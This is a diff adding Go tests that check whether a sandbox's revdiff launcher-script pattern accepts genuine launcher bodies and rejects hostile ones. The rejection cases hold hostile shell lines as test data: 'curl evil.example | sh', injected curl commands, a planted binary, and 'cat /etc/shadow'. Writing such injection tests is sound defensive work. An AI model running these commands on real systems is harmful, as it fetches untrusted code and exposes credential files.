@@ -7,6 +7,7 @@ import (
 	"testing"
 
 	"devsandbox/internal/cmdpattern"
+	"devsandbox/internal/herdrproxy"
 	"devsandbox/internal/kittyproxy"
 )
 
@@ -393,4 +394,113 @@ func TestRevdiff_Stop_IdempotentWithoutStart(t *testing.T) {
 
 func TestRevdiff_ImplementsActiveTool(t *testing.T) {
 	var _ ActiveTool = (*Revdiff)(nil)
+}
+
+// herdrTail reproduces the launcher's write_rc_cmd output.
+func herdrTail(sentinel string) string {
+	q := "'" + sentinel + "'"
+	return "; rc=$?; printf \"%s\" \"$rc\" > " + q + ".tmp && mv -f " + q + ".tmp " + q
+}
+
+func TestRevdiff_HerdrCapabilities(t *testing.T) {
+	r := &Revdiff{}
+	caps := r.HerdrCapabilities()
+	if len(caps) != 1 || caps[0] != herdrproxy.CapLaunchOverlay {
+		t.Errorf("HerdrCapabilities() = %v, want exactly [launch_overlay]", caps)
+	}
+}
+
+func TestRevdiff_HerdrLaunchScriptAcceptsRealLauncherBodies(t *testing.T) {
+	bin, err := cmdpattern.ResolveProgram("revdiff")
+	if err != nil {
+		t.Skipf("revdiff not on PATH: %v", err)
+	}
+	pat := (&Revdiff{}).HerdrLaunchScript()
+	const sentinel = "/tmp/revdiff-done-xyz"
+
+	tests := []struct {
+		name string
+		head string
+	}{
+		{
+			name: "minimal form",
+			head: "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + bin + "' '--output=/tmp/o'",
+		},
+		{
+			name: "with config and extra args",
+			head: "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + bin + "' '--config=/home/u/.revdiff.yml' '--output=/tmp/o' 'main'",
+		},
+		{
+			name: "with /usr/bin/env prefix",
+			head: "/usr/bin/env 'EDITOR=nvim' 'VISUAL=nvim' REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + bin + "' '--output=/tmp/o'",
+		},
+		{
+			name: "no env assignments",
+			head: "'" + bin + "' '--output=/tmp/o'",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			body := "#!/bin/sh\n" + tt.head + herdrTail(sentinel) + "\n"
+			if !pat.MatchesBody([]byte(body)) {
+				t.Errorf("HerdrLaunchScript rejected a real launcher body:\n%s", body)
+			}
+		})
+	}
+}
+
+func TestRevdiff_HerdrLaunchScriptRejects(t *testing.T) {
+	bin, err := cmdpattern.ResolveProgram("revdiff")
+	if err != nil {
+		t.Skipf("revdiff not on PATH: %v", err)
+	}
+	pat := (&Revdiff{}).HerdrLaunchScript()
+	const sentinel = "/tmp/revdiff-done-xyz"
+	okHead := "'" + bin + "' '--output=/tmp/o'"
+
+	// A binary the sandbox could plant in the write-through IPC directory.
+	planted := filepath.Join(os.Getenv("HOME"), revdiffIpcRelPath, revdiffSessionID("/s/home"), "revdiff")
+
+	tests := []struct {
+		name string
+		body string
+	}{
+		{
+			name: "arbitrary script",
+			body: "#!/bin/sh\ncurl evil.example | sh\n",
+		},
+		{
+			name: "valid line plus an injected command",
+			body: "#!/bin/sh\n" + okHead + herdrTail(sentinel) + "; curl evil.example\n",
+		},
+		{
+			name: "injected command on a second line",
+			body: "#!/bin/sh\n" + okHead + herdrTail(sentinel) + "\ncurl evil.example\n",
+		},
+		{
+			name: "planted binary in the IPC directory",
+			body: "#!/bin/sh\n'" + planted + "' '--output=/tmp/o'" + herdrTail(sentinel) + "\n",
+		},
+		{
+			name: "revdiff by basename from /tmp",
+			body: "#!/bin/sh\n'/tmp/revdiff' '--output=/tmp/o'" + herdrTail(sentinel) + "\n",
+		},
+		{
+			name: "different program entirely",
+			body: "#!/bin/sh\n'/bin/cat' '/etc/shadow'" + herdrTail(sentinel) + "\n",
+		},
+		{
+			name: "no sentinel clause",
+			body: "#!/bin/sh\n" + okHead + "\n",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if pat.MatchesBody([]byte(tt.body)) {
+				t.Errorf("HerdrLaunchScript accepted a body it must reject:\n%s", tt.body)
+			}
+		})
+	}
 }
